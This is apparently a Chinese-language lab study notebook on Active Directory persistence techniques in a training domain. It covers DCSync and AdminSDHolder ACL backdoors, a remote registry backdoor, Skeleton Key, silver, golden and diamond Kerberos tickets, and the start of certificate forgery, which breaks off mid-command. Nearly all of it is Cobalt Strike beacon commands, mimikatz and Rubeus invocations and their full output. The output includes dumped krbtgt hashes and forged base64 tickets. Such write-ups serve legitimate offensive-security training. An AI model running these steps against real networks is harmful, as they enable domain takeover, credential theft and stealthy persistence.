# DCSync Backdoor

给域用户赋予DCSync权限

1. 以bfarmer身份尝试执行dcsync，报错
```
dcsync dev.cyberbotic.io DEV\krbtgt
```

![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1661070978692.png)

2. 以域管理员的身份给bfarmer赋予DCSync权限

```
beacon> getuid
[*] Tasked beacon to get userid
[+] host called home, sent: 8 bytes
[*] You are DEV\nlamb
beacon> powershell-import C:\Tools\PowerSploit\Recon\PowerView.ps1
[*] Tasked beacon to import: C:\Tools\PowerSploit\Recon\PowerView.ps1
[+] host called home, sent: 145560 bytes
beacon> powershell Add-DomainObjectAcl -TargetIdentity "DC=dev,DC=cyberbotic,DC=io" -PrincipalIdentity bfarmer -Rights DCSync
```


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1661071217716.png)

3. 以bfarmer身份再次执行dcsync,成功

```
beacon> getuid
[*] Tasked beacon to get userid
[+] host called home, sent: 8 bytes
[*] You are DEV\bfarmer
beacon> dcsync dev.cyberbotic.io DEV\krbtgt
[*] Tasked beacon to run mimikatz's @lsadump::dcsync /domain:dev.cyberbotic.io /user:DEV\krbtgt command
[+] host called home, sent: 297586 bytes
[+] received output:
[DC] 'dev.cyberbotic.io' will be the domain
[DC] 'dc-2.dev.cyberbotic.io' will be the DC server
[DC] 'DEV\krbtgt' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : krbtgt

** SAM ACCOUNT **

SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   : 
Password last change : 2/19/2021 1:31:57 PM
Object Security ID   : S-1-5-21-3263068140-2042698922-2891547269-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: 833ef1dcc490f88a8f4a8a00859736de
    ntlm- 0: 833ef1dcc490f88a8f4a8a00859736de
    lm  - 0: b22a486933e82eb32723ebde745d18f4

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : ab6cf712f4b01301770b3b4a96803ac9

* Primary:Kerberos-Newer-Keys *
    Default Salt : DEV.CYBERBOTIC.IOkrbtgt
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa
      aes128_hmac       (4096) : 473a92cc46d09d3f9984157f7dbc7822
      des_cbc_md5       (4096) : b9fefed6da865732

* Primary:Kerberos *
    Default Salt : DEV.CYBERBOTIC.IOkrbtgt
    Credentials
      des_cbc_md5       : b9fefed6da865732

* Packages *
    NTLM-Strong-NTOWF

```


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1661071275240.png)

# AdminSDHolder Backdoor

1. 以bfarmer的身份尝试将自己添加进DA，失败

```
 run net group "Domain Admins" bfarmer /add /domain
```


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1661071431873.png)

2. 以nlamb的身份赋予bfarmer AdminSDHolder的控制权限

```
powershell Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=dev,DC=cyberbotic,DC=io" -PrincipalIdentity bfarmer -Rights All
```


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1661071563457.png)

3. 现在再以bfarmer的身份尝试将自己添加进DA。**注意**这里需要等待上面的规则在域里完全传播以后再执行下面的命令

```
beacon> getuid
[*] You are DEV\bfarmer

beacon> run net group "Domain Admins" /domain
The request will be processed at a domain controller for domain dev.cyberbotic.io.

Group name     Domain Admins
Comment        Designated administrators of the domain

Members

-------------------------------------------------------------------------------
Administrator            nlamb                    
The command completed successfully.

beacon> run net group "Domain Admins" bfarmer /domain /add
The request will be processed at a domain controller for domain dev.cyberbotic.io.

The command completed successfully.

beacon> run net group "Domain Admins" /domain
The request will be processed at a domain controller for domain dev.cyberbotic.io.

Group name     Domain Admins
Comment        Designated administrators of the domain

Members

-------------------------------------------------------------------------------
Administrator            bfarmer                  nlamb                    
The command completed successfully.
```

# Remote Registry Backdoor

1. 在srv-2操作,给bfarmer 添加远程注册表后门

```
beacon> run hostname
[*] Tasked beacon to run: hostname
[+] host called home, sent: 26 bytes
[+] received output:
srv-2

beacon> powershell-import C:\Tools\DAMP\Add-RemoteRegBackdoor.ps1
[*] Tasked beacon to import: C:\Tools\DAMP\Add-RemoteRegBackdoor.ps1
[+] host called home, sent: 4344 bytes
beacon> powershell Add-RemoteRegBackdoor -Trustee DEV\bfarmer
[*] Tasked beacon to run: Add-RemoteRegBackdoor -Trustee DEV\bfarmer
[+] host called home, sent: 385 bytes
[+] received output:
#< CLIXML

ComputerName BackdoorTrustee
------------ ---------------
SRV-2        DEV\bfarmer    

```


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1661072331977.png)

2. 以bfarmer的身份获取远程主机的哈希

```
beacon> powershell-import C:\Tools\DAMP\RemoteHashRetrieval.ps1
[*] Tasked beacon to import: C:\Tools\DAMP\RemoteHashRetrieval.ps1
[+] host called home, sent: 24916 bytes
beacon> getuid
[*] Tasked beacon to get userid
[+] host called home, sent: 8 bytes
[*] You are DEV\bfarmer
beacon> ls \\srv-2\c$
[*] Tasked beacon to list files in \\srv-2\c$
[+] host called home, sent: 28 bytes
[-] could not open \\srv-2\c$\*: 5
beacon> powershell Get-RemoteMachineAccountHash -ComputerName srv-2
[*] Tasked beacon to run: Get-RemoteMachineAccountHash -ComputerName srv-2
[+] host called home, sent: 401 bytes
[+] received output:
#< CLIXML

ComputerName MachineAccountHash              
------------ ------------------              
srv-2        f797a8372d1e7a821e49f61efca73e23

```


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1661072540108.png)

# Skeleton Key

万能钥匙

先拿到dc-2的beacon，因为dc-2有反病毒软件，但是这个文件夹是排除项
```
\\dc-2\c$\Shares\software
```

nlamb身份进到上面文件夹，上传rev.exe执行拿到beacon


1. 在dc-2执行制作万能钥匙
```
beacon> getuid
[*] Tasked beacon to get userid
[+] host called home, sent: 8 bytes
[*] You are DEV\Administrator (admin)
beacon> run hostname
[*] Tasked beacon to run: hostname
[+] host called home, sent: 26 bytes
[+] received output:
dc-2

beacon> mimikatz !misc::skeleton
[*] Tasked beacon to run mimikatz's !misc::skeleton command
[+] host called home, sent: 788081 bytes
[+] received output:
[KDC] data
[KDC] struct
[KDC] keys patch OK
[RC4] functions
[RC4] init patch OK
[RC4] decrypt patch OK
```

![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1661073889938.png)

2. 万能钥匙的密码都是mimikatz

bfarmer用万能钥匙使用administrator的身份访问dc-2

```
beacon> getuid
[*] Tasked beacon to get userid
[+] host called home, sent: 8 bytes
[*] You are DEV\bfarmer
beacon> make_token DEV\Administrator mimikatz
[*] Tasked beacon to create a token for DEV\Administrator
[+] host called home, sent: 44 bytes
[+] Impersonated DEV\bfarmer
beacon> ls \\dc-2\c$
[*] Tasked beacon to list files in \\dc-2\c$
[+] host called home, sent: 27 bytes
[*] Listing: \\dc-2\c$\

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     02/19/2021 11:11:35   $Recycle.Bin
          dir     02/10/2021 03:23:44   Boot
          dir     10/18/2016 01:59:39   Documents and Settings
          dir     02/23/2018 11:06:05   PerfLogs
          dir     01/20/2022 16:37:14   Program Files
          dir     02/10/2021 02:01:55   Program Files (x86)
          dir     08/16/2022 23:15:06   ProgramData
          dir     10/18/2016 02:01:27   Recovery
          dir     03/25/2021 10:23:35   Shares
          dir     02/19/2021 11:49:20   System Volume Information
          dir     03/01/2022 10:51:31   Users
          dir     08/21/2022 09:11:43   Windows
 379kb    fil     01/28/2021 07:09:16   bootmgr
 1b       fil     07/16/2016 13:18:08   BOOTNXT
 1kb      fil     03/01/2022 10:55:07   dc-2.dev.cyberbotic.io_ca-2.req
 887mb    fil     08/21/2022 09:18:43   pagefile.sys
```


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1661073999207.png)

# Silver Tickets


首先我们必须要知道srv-2的主机NTML（或者aes-256）哈希

这里利用NTML哈希：```f797a8372d1e7a821e49f61efca73e23```

1. 使用mimikatz离线制作一张srv-2的银票

```
kerberos::golden /user:Administrator /domain:dev.cyberbotic.io /sid:S-1-5-21-3263068140-2042698922-2891547269 /target:srv-2 /service:cifs /rc4:f797a8372d1e7a821e49f61efca73e23 /ticket :srv2-cifs.kirbi
```

1661074812426.png

2. 导入票据，访问srv-2

```
beacon> make_token DEV\Administrator FakePass
[*] Tasked beacon to create a token for DEV\Administrator
[+] host called home, sent: 44 bytes
[+] Impersonated DEV\bfarmer
beacon> kerberos_ticket_use C:\Users\Administrator\Desktop\ticket.kirbi
[*] Tasked beacon to apply ticket in C:\Users\Administrator\Desktop\ticket.kirbi
[+] host called home, sent: 2953 bytes
beacon> ls \\srv-2\c$
[*] Tasked beacon to list files in \\srv-2\c$
[+] host called home, sent: 28 bytes
[*] Listing: \\srv-2\c$\

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     02/10/2021 04:11:30   $Recycle.Bin
          dir     02/10/2021 03:23:44   Boot
          dir     10/18/2016 01:59:39   Documents and Settings
          dir     02/23/2018 11:06:05   PerfLogs
          dir     01/20/2022 15:46:19   Program Files
          dir     02/10/2021 02:01:55   Program Files (x86)
          dir     08/17/2022 23:31:10   ProgramData
          dir     10/18/2016 02:01:27   Recovery
          dir     03/29/2021 12:15:45   System Volume Information
          dir     02/17/2021 18:32:08   Users
          dir     08/21/2022 08:53:59   Windows
 379kb    fil     01/28/2021 07:09:16   bootmgr
 1b       fil     07/16/2016 13:18:08   BOOTNXT
 256mb    fil     08/21/2022 08:26:36   pagefile.sys
```


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1661074966539.png)

# Golden Tickets

金票必须知道krbtgt的哈希

上面已经枚举出来是：

```
NTLM:833ef1dcc490f88a8f4a8a00859736de

AES256:390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa
```

1. 使用krbtgt哈希制作金票

```
kerberos::golden /user:Administrator /domain:dev.cyberbotic.io /sid:S-1-5-21-3263068140-2042698922-2891547269 /aes256:390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa /ticket:golden.kirbi
```

或者

```
kerberos::golden /user:Administrator /domain:dev.cyberbotic.io /sid:S-1-5-21-3263068140-2042698922-2891547269 /rc4:833ef1dcc490f88a8f4a8a00859736de /ticket:golden.kirbi
```


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1661075200481.png)

2. 导入金票，访问dc-2

```
beacon> make_token DEV\Administrator FakePass
[*] Tasked beacon to create a token for DEV\Administrator
[+] host called home, sent: 44 bytes
[+] Impersonated DEV\bfarmer
beacon> kerberos_ticket_use C:\Users\Administrator\Desktop\golden.kirbi
[*] Tasked beacon to apply ticket in C:\Users\Administrator\Desktop\golden.kirbi
[+] host called home, sent: 2981 bytes
beacon> ls \\dc-2\c$
[*] Tasked beacon to list files in \\dc-2\c$
[+] host called home, sent: 27 bytes
[*] Listing: \\dc-2\c$\

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     02/19/2021 11:11:35   $Recycle.Bin
          dir     02/10/2021 03:23:44   Boot
          dir     10/18/2016 01:59:39   Documents and Settings
          dir     02/23/2018 11:06:05   PerfLogs
          dir     01/20/2022 16:37:14   Program Files
          dir     02/10/2021 02:01:55   Program Files (x86)
          dir     08/16/2022 23:15:06   ProgramData
          dir     10/18/2016 02:01:27   Recovery
          dir     03/25/2021 10:23:35   Shares
          dir     02/19/2021 11:49:20   System Volume Information
          dir     03/01/2022 10:51:31   Users
          dir     08/21/2022 09:11:43   Windows
 379kb    fil     01/28/2021 07:09:16   bootmgr
 1b       fil     07/16/2016 13:18:08   BOOTNXT
 1kb      fil     03/01/2022 10:55:07   dc-2.dev.cyberbotic.io_ca-2.req
 887mb    fil     08/21/2022 09:18:43   pagefile.sys

```


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1661075476302.png)

# Diamond Tickets

查看域用户名和sid
```
beacon> powershell Get-NetUser |select cn,objectsid
[*] Tasked beacon to run: Get-NetUser |select cn,objectsid
[+] host called home, sent: 357 bytes
[+] received output:
#< CLIXML

cn             objectsid                                     
--             ---------                                     
Administrator  S-1-5-21-3263068140-2042698922-2891547269-500 
Guest          S-1-5-21-3263068140-2042698922-2891547269-501 
DefaultAccount S-1-5-21-3263068140-2042698922-2891547269-503 
krbtgt         S-1-5-21-3263068140-2042698922-2891547269-502 
Nina Lamb      S-1-5-21-3263068140-2042698922-2891547269-1112
Bob Farmer     S-1-5-21-3263068140-2042698922-2891547269-1120
Joyce Adams    S-1-5-21-3263068140-2042698922-2891547269-1121
John King      S-1-5-21-3263068140-2042698922-2891547269-1122
Oracle Service S-1-5-21-3263068140-2042698922-2891547269-1127
MS SQL Service S-1-5-21-3263068140-2042698922-2891547269-1134
Honey Service  S-1-5-21-3263068140-2042698922-2891547269-1137
Squid Proxy    S-1-5-21-3263068140-2042698922-2891547269-1138

```


使用rebeus制作钻票，krbkey是krbtgt的aes256 哈希
```
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe diamond /tgtdeleg /ticketuser:nlamb /ticketuserid:1112 /groups:512 /krbkey:390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa /nowrap
[*] Tasked beacon to run .NET program: Rubeus.exe diamond /tgtdeleg /ticketuser:nlamb /ticketuserid:1112 /groups:512 /krbkey:390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa /nowrap
[+] host called home, sent: 585553 bytes
[+] received output:

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.1 

[*] Action: Diamond Ticket

[*] No target SPN specified, attempting to build 'cifs/dc.domain.com'
[*] Initializing Kerberos GSS-API w/ fake delegation for target 'cifs/dc-2.dev.cyberbotic.io'
[+] Kerberos GSS-API initialization success!
[+] Delegation requset success! AP-REQ delegation ticket is now in GSS-API output.
[*] Found the AP-REQ delegation ticket in the GSS-API output.
[*] Authenticator etype: aes256_cts_hmac_sha1
[*] Extracted the service ticket session key from the ticket cache: Jv20RufkHst0H3cnOpCmY3SyBm3vAFxsMp1MPHpyzBs=
[+] Successfully decrypted the authenticator
[*] base64(ticket.kirbi):

      doIErzCCBKugAwIBBaEDAgEWooIDoDCCA5xhggOYMIIDlKADAgEFoRMbEURFVi5DWUJFUkJPVElDLklPoiYwJKADAgECoR0wGxsGa3JidGd0GxFERVYuQ1lCRVJCT1RJQy5JT6OCA04wggNKoAMCARKhAwIBAqKCAzwEggM4oVinLCwTZzDMMCggeoW5QKOfW59mo6i8s+P5rxhJ2I/XzT4B9mYv6Y97TILRyyGHroS6/oY1Ba2eHxGXksbwfs8/ZEl6kFmwlHpvsozfh+TUYufOkLLtvXvSDefV26sC49IxSXM7fIMb3ZGvoRj/Z5cE4U7LbcEI6hz47lZdi8KkwCyUmj61SMWamvPS/1ZoaGYX9EkXLbv38MVItqT5422wR8tmd1wI+KyEhGQsCpYGuBsfhD/0S6UPIZmM32TBo3Uti5Cwcx5Wwxs88c3PwTy4/rNahvSbVzM+jIWHHrubFsCkvWlyuzSnSVtQL6T61kW/Rd0SnBs2hlacTnCT3a6G35/JBgcDUM2q3U6l1+AQa4H3wWcsl0i9SxrkEdiBQO42Nxq606gRM6uEVYeWtrV/RtzE1eN6b4342tee+Jiyyd01yc0x/fy4nyXrE3JSOkap6JjDWwlkCCpxvYbXiCEXZfD0MAafLbJAtemy/VXxSf70LLYmyhMUjCeZGf+myyBt584VmanC5kfbTqNoMe9yh+zauCLuj0ccaVHNhuZu1DKhsVdwKuEAAs0F9Sqfzy9lgxYVQsgL/MBc1fcbwJMNud7ZbD19SeO4KEbylin8eHrempfRZ9d3eBLxu6fvQRJdaN9XaxePYrEVuQ56jwFAycHGwVZ+KZRHtBABOhAkliivaS0PVtWqUv2csSyJ97t6MmGNaDt9CazOYXv0qrnJ6kwsm9noDzTVxhRWJ5uQyjbIWxb2r5VcDRvS9+lj1p0sOhKBjvNiZoGIq3AxPbSv1xJFUE0PugpdZr4pSQW0NGst1wwx+LSroINwBDiNMXf+Ao1h+0o+bvc+Rxoo0XlghjSahtf3cjSKjMd6YfWATOlcdwM5fNM0SlV26erFYupOkgv8JDAA+lE1xayTAGkEaP68cagzrZmd5r9y9g3d+CRn6zQmthLAiHZrfeTX5D2AGSH16bTS5fG8JoJc7OeMbzPebP3P3B9WJT/cehwSSWe9s3DG2lsW1RnPXBjJZfIkIc8uu+2fN3QATMXmTjw7GcFkFgqX8FlLQtaLC9RXuwJ5pfbiVhVH01TDM3OetU7B9ODWMXOjgfowgfegAwIBAKKB7wSB7H2B6TCB5qCB4zCB4DCB3aArMCmgAwIBEqEiBCA/EgUe14UNfhtgzl7gRO/KBIrBqxCqLRFjp6rLWxv9HKETGxFkZXYuY3liZXJib3RpYy5pb6IaMBigAwIBAaERMA8bDUFkbWluaXN0cmF0b3KjBwMFAGAhAAClERgPMjAyMjA4MjIwMDI5MjFaphEYDzIwMjIwODIyMTAxODQxWqcRGA8xOTcwMDEwMTAwMDAwMFqoExsRZGV2LmN5YmVyYm90aWMuaW+pJjAkoAMCAQKhHTAbGwZrcmJ0Z3QbEURFVi5DWUJFUkJPVElDLklP

[*] Decrypting TGT
[*] Retreiving PAC
[*] Modifying PAC
[*] Signing PAC
[*] Encrypting Modified TGT

[*] base64(ticket.kirbi):

      doIEcjCCBG6gAwIBBaEDAgEWooIDazCCA2dhggNjMIIDX6ADAgEFoRMbEURFVi5DWUJFUkJPVElDLklPoiYwJKADAgECoR0wGxsGa3JidGd0GxFERVYuQ1lCRVJCT1RJQy5JT6OCAxkwggMVoAMCARKhAwIBA6KCAwcEggMDq/uS0GUxvFljhaSsZtQbwd6beKWRJoqIDql7NCrnOMysfVx16vdKaYugHIiq36byL3YUup6cjipHmaam99JsOgqGqr34Eg+e2WGSIW+fPHdmuCAGhneRLWh0Oi3dgm8FEeDR+vkBJf/o5uBZae0tVbIsViRa/WMcH5Pn2tBPadtcHmmFIvE6X+ZJ59reeOyRWEFomh2vytL7csGv6SrUo4bUi0F0elMqa17ammDuf+xgCMPAJQ3YW5yl1/2WjHmZtx0wPRNpMScuIF+k9lNsHHPFNtfrxXYatCr4cHPmMuY7VLG6LlREB7PNsTfpauqGeXiT+JdLde/ax/fD0iRNce2uJtO68PFVnmIMT+U9Qm03Cd60ySkVipixcFlOpoAAAYATlg9pocFrAKfKcQZVpGyWl1JriGTv3YY4dUuLq1YdeXW/hqS0SXcRpeQSj1cA5NxycYvypygDgpq6JKZr8rIGnUuDI5lY50poh5DcGJJ4Za1XtAtRbCqnBbJHgidIM7JmBYmrenLHN+NAlCzdjUNNPHexiiKQ4EL35JPrV3plK29QB7behDic6oshZY6kt4uQVVTyt0W5AzU6Z98kl8HRxnlcOzVJ4GiDEQJFIUOq5e6gy+1bL/8cZi0s+iX56GSqg7+fDtd9gKCyAXS4kJqRwqeHDSs2y3XAudiMrz7g6FiEnNXZ2z+xKoGhqHt2kMyARSe1I1JNSXXexSdAFQo9SPjd95lTS9tEK93qn5jWHf85D6kfJ3JruisHYSXhOm0Nf2S3dJZ4dyuFA0pHH6gylKhjL4pMoqUKDEet0gapZABnr52ZkSVVwkVyUrHYhkrpjzXK+/WbckCXGvoGsnFSN9PVVwsbTQegraY0i0o3UpCKEpLr2Xjzm8DmA3tq794natLO4oluVOc0oQMh7MQ2cuRLNHaaN+Sz3tSKWY5h3CWlbWWeCaEMXClqnNzT0wH0/6dymzl2BdJ09ff1jhn1NpYHcj0fJarzqjm06s9Cmd4GkSoAqcsfdpgOhDlQsLvto4HyMIHvoAMCAQCigecEgeR9geEwgd6ggdswgdgwgdWgKzApoAMCARKhIgQgPxIFHteFDX4bYM5e4ETvygSKwasQqi0RY6eqy1sb/RyhExsRZGV2LmN5YmVyYm90aWMuaW+iEjAQoAMCAQGhCTAHGwVubGFtYqMHAwUAYCEAAKURGA8yMDIyMDgyMjAwMjkyMVqmERgPMjAyMjA4MjIxMDE4NDFapxEYDzE5NzAwMTAxMDAwMDAwWqgTGxFkZXYuY3liZXJib3RpYy5pb6kmMCSgAwIBAqEdMBsbBmtyYnRndBsRREVWLkNZQkVSQk9USUMuSU8=


```



![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1661075757675.png)


查看tgt描述

```
C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe describe /ticket:doIFYjCCBV6gAwIBBaEDAgEWooIEWzCCBFdhggRTMIIET6ADAgEFoRMbEURFVi5DWUJFUkJPVElDLklPoiYwJKADAgECoR0wGxsGa3JidGd0GxFERVYuQ1lCRVJCT1RJQy5JT6OCBAkwggQFoAMCARKhAwIBA6KCA/cEggPziks1/fH99qJFUMYsfX3naRpdhd7PJShwEQmyKahE14TwSvo/z/VB4jBSBeA8tz7ix0Kd5YWxA1xgyUmtYJnSYbDunjXDRQtTvuxXNGDOVSKg5qbxLvBZ4vJi3FTepaRhI+4qNRfw3AYYQ/6jj80fFO9SLMVUmoIHbHotYaOag+StGgz6lfxxiIzntfKFjh+aix/l90OLTONaLRIpGhqKQxWf5wMUid7T1zYSBsUdFmjNxx8iJe7kUFBR6lBK12oq6CWD98N5phOofpd2lR70ojwwRQu6TSRdDfPEHxxuy7ruHmGw/h9EkQFFwgVIgqGiQYjZYBezpIywfyt5PYAjxKRrF1M7n3Sb34uwxJh6jIzAvIPPkmO6WZFAF3SypZmIo8EWzR8ncMPYkfKGc83JaEpQICYQ1ugjNzE9f8vd0obBDrLJuk9W0thOFgni7AjNw7IVCPUAfp8qW9RpwEDobAaF9ZB+7HqloZI0r6a/1bLGqQQHsBA0RabOCANSIbkRW818M8NLBB55fumehDBZUrX6vwGwTe5IhNrcGA3zUk5zu0G1rRzQtAhhK1ZjgCCfsi8dUTdAjudEyQZJi+ZFxjLB0t7ehBj3K03sfrIg51OL7JoUoLaMHf6M0eYA1vVWHhrWSnKfXptkf3ku3M5sFf0+1WzzJS1OSNJFaM9VUe4BOT6OGpSl+/IETDgsOTe5nsIKLZeTHRYY7eVGt521dSgqYYF7J8WdlgdsV8pLqTzYyl3WUEGNMM+f4eNzPvh0sDCchYwddMZwClRKiguxuzVsUyDcRuzjVo+xc+19nRpOsLuMYq2ATMufH7GEE0dR+g6R1t7QBmB2cdO+5AgYLhr8u+I2ZxH1cXqONtKB3B5wwMwbVhgq/j8u27Mv11SHM3teyu0XxVtGuS7FmWoGef+8U6weX/XEdoYK+cOkbzRsx/si3qjAWkFz33I892TDLJyEA9OD/B1NC/nr7c7McbePu75sLVGI+FZ65gOrApsddfpmhlYXux6jiFAAtGx1azxAJB9LDdHo4yGpa3iHuD6NRkaGnzS9SlJQ9l8Dq2Qcxs21oigcNwDEwKLXyXmKR45tTRfquzmSbHjbqMRueISqBkAmKZ4mfYR1koXoN4XjMmTMzLitg1+ufm2hrpMkBWxyAr6zbYksXeKfVwIYbXihjngFDfDkVfIMzfLaD/TvVUCYnB0InB1vvqR3wG9+QNtbjgkSgqemDFSSnghFhCYqSahd4EBW6vJCz7JqRjDDS8Wh4JKW76LD+V/FaVyHGX/WbeEjOpo1cvh259HmnYpNWK0gtQ10yKDQsUOIvgtD2ItYg0hxHSpG8mgV/kIx+nt6o4HyMIHvoAMCAQCigecEgeR9geEwgd6ggdswgdgwgdWgKzApoAMCARKhIgQg52/BhpO82o8JMS9FDMzbl/uvSGUJowxbGtGFFpwHYlqhExsRREVWLkNZQkVSQk9USUMuSU+iEjAQoAMCAQGhCTAHGwVubGFtYqMHAwUAYCEAAKURGA8yMDIyMDgyMTA4MzI1MVqmERgPMjAyMjA4MjExODMyNTFapxEYDzE5NzAwMTAxMDAwMDAwWqgTGxFERVYuQ1lCRVJCT1RJQy5JT6kmMCSgAwIBAqEdMBsbBmtyYnRndBsRREVWLkNZQkVSQk9USUMuSU8=
```


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1661075843395.png)


用powershell根据tgt制作ticket
```
[IO.File]::WriteAllBytes("C:\Users\Administrator\desktop\nlamb.kirbi", [Convert]::FromBase64String("doIEcjCCBG6gAwIBBaEDAgEWooIDazCCA2dhggNjMIIDX6ADAgEFoRMbEURFVi5DWUJFUkJPVElDLklPoiYwJKADAgECoR0wGxsGa3JidGd0GxFERVYuQ1lCRVJCT1RJQy5JT6OCAxkwggMVoAMCARKhAwIBA6KCAwcEggMDq/uS0GUxvFljhaSsZtQbwd6beKWRJoqIDql7NCrnOMysfVx16vdKaYugHIiq36byL3YUup6cjipHmaam99JsOgqGqr34Eg+e2WGSIW+fPHdmuCAGhneRLWh0Oi3dgm8FEeDR+vkBJf/o5uBZae0tVbIsViRa/WMcH5Pn2tBPadtcHmmFIvE6X+ZJ59reeOyRWEFomh2vytL7csGv6SrUo4bUi0F0elMqa17ammDuf+xgCMPAJQ3YW5yl1/2WjHmZtx0wPRNpMScuIF+k9lNsHHPFNtfrxXYatCr4cHPmMuY7VLG6LlREB7PNsTfpauqGeXiT+JdLde/ax/fD0iRNce2uJtO68PFVnmIMT+U9Qm03Cd60ySkVipixcFlOpoAAAYATlg9pocFrAKfKcQZVpGyWl1JriGTv3YY4dUuLq1YdeXW/hqS0SXcRpeQSj1cA5NxycYvypygDgpq6JKZr8rIGnUuDI5lY50poh5DcGJJ4Za1XtAtRbCqnBbJHgidIM7JmBYmrenLHN+NAlCzdjUNNPHexiiKQ4EL35JPrV3plK29QB7behDic6oshZY6kt4uQVVTyt0W5AzU6Z98kl8HRxnlcOzVJ4GiDEQJFIUOq5e6gy+1bL/8cZi0s+iX56GSqg7+fDtd9gKCyAXS4kJqRwqeHDSs2y3XAudiMrz7g6FiEnNXZ2z+xKoGhqHt2kMyARSe1I1JNSXXexSdAFQo9SPjd95lTS9tEK93qn5jWHf85D6kfJ3JruisHYSXhOm0Nf2S3dJZ4dyuFA0pHH6gylKhjL4pMoqUKDEet0gapZABnr52ZkSVVwkVyUrHYhkrpjzXK+/WbckCXGvoGsnFSN9PVVwsbTQegraY0i0o3UpCKEpLr2Xjzm8DmA3tq794natLO4oluVOc0oQMh7MQ2cuRLNHaaN+Sz3tSKWY5h3CWlbWWeCaEMXClqnNzT0wH0/6dymzl2BdJ09ff1jhn1NpYHcj0fJarzqjm06s9Cmd4GkSoAqcsfdpgOhDlQsLvto4HyMIHvoAMCAQCigecEgeR9geEwgd6ggdswgdgwgdWgKzApoAMCARKhIgQgPxIFHteFDX4bYM5e4ETvygSKwasQqi0RY6eqy1sb/RyhExsRZGV2LmN5YmVyYm90aWMuaW+iEjAQoAMCAQGhCTAHGwVubGFtYqMHAwUAYCEAAKURGA8yMDIyMDgyMjAwMjkyMVqmERgPMjAyMjA4MjIxMDE4NDFapxEYDzE5NzAwMTAxMDAwMDAwWqgTGxFkZXYuY3liZXJib3RpYy5pb6kmMCSgAwIBAqEdMBsbBmtyYnRndBsRREVWLkNZQkVSQk9USUMuSU8="))
```


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1661075988659.png)

3. 导入钻票，访问DC-2


```
beacon> getuid
[*] Tasked beacon to get userid
[+] host called home, sent: 8 bytes
[*] You are DEV\bfarmer
beacon> ls \\dc-2\c$
[*] Tasked beacon to list files in \\dc-2\c$
[+] host called home, sent: 27 bytes
[-] could not open \\dc-2\c$\*: 5
beacon> make_token DEV\nlamb FakePass
[*] Tasked beacon to create a token for DEV\nlamb
[+] host called home, sent: 36 bytes
[+] Impersonated DEV\bfarmer
beacon> kerberos_ticket_use C:\Users\Administrator\Desktop\nlamb.kirbi
[*] Tasked beacon to apply ticket in C:\Users\Administrator\Desktop\nlamb.kirbi
[+] host called home, sent: 2704 bytes
beacon> ls \\dc-2\c$
[*] Tasked beacon to list files in \\dc-2\c$
[+] host called home, sent: 27 bytes
[*] Listing: \\dc-2\c$\

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     02/19/2021 11:11:35   $Recycle.Bin
          dir     02/10/2021 03:23:44   Boot
          dir     10/18/2016 01:59:39   Documents and Settings
          dir     02/23/2018 11:06:05   PerfLogs
          dir     01/20/2022 16:37:14   Program Files
          dir     02/10/2021 02:01:55   Program Files (x86)
          dir     08/16/2022 23:15:06   ProgramData
          dir     10/18/2016 02:01:27   Recovery
          dir     03/25/2021 10:23:35   Shares
          dir     02/19/2021 11:49:20   System Volume Information
          dir     03/01/2022 10:51:31   Users
          dir     08/21/2022 09:11:43   Windows
 379kb    fil     01/28/2021 07:09:16   bootmgr
 1b       fil     07/16/2016 13:18:08   BOOTNXT
 1kb      fil     03/01/2022 10:55:07   dc-2.dev.cyberbotic.io_ca-2.req
 704mb    fil     08/22/2022 00:07:00   pagefile.sys
```


![img](https://github.com/maxzxc0110/hack-study/blob/main/img/1661129157072.png)

# Forged Certificates

DC-1有applocker，到指定目录上传一个tcp payload，运行以后主动连接，拿到一个beacon

```
beacon> connect dc-1
[*] Tasked to connect to dc-1:4444
[+] host called home, sent: 15 bytes
[+] established link to child beacon: 10.10.15.75
```

1. 在dc-1执行，伪造一份证书
```
beacon> run hostname
[*] Tasked beacon to run: hostname
[+] host called home, sent: 26 bytes
[+] received output:
dc-1

beacon> getuid
[*] Tasked beacon to get userid
[+] host called home, sent: 8 bytes
[*] You are CYBER\Administrator (admin)
beacon> execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Debug\SharpDPAPI.exe certificates /machine
[*] Tasked beacon to run .NET program: SharpDPAPI.exe certificates /machine
